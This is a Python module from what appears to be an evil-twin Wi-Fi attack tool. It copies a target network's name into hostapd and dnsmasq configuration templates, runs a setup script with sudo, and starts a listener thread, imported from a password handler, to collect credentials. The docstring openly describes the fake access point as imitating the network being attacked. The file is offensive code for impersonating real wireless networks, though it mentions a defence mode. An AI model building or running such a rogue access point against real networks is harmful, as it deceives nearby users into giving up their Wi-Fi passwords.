import os
from threading import Thread
from string import Template
from FakeAccessPoint.password_handler import start_listen

def create_fake_access_point(SSID, defence=False):
    """
    this function create similar access point to the access point we want to perform attack on
    :param BSSID represent the access point name.
    :param defence True if we want to perform defence , otherwise False.
            """
    print('The Fake Access Point is now available using Name : {} '.format(SSID))
    listen_thread = Thread(target=start_listen, daemon=True)
    listen_thread.start()


def build_files(SSID,interface):
        """
        prepare the environment setup for creating the fake access point
        :param BSSID represent the network name
        """
        os.system('rm -rf build/')
        os.system('cp -r FakeAccessPoint/Templates build')
        with open('build/hostapd.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=interface, NETWORK=SSID))
            f.truncate()
        with open('build/dnsmasq.conf', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=interface))
            f.truncate()
        with open('build/prepareAP.sh', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(INTERFACE=interface))
            f.truncate()
        with open('build/cleanup.sh', 'r+') as f:
            template = Template(f.read())
            f.seek(0)
            f.write(template.substitute(SNIFFER=interface, AP=interface))
            f.truncate()

        os.system('sudo sh build/prepareAP.sh')   
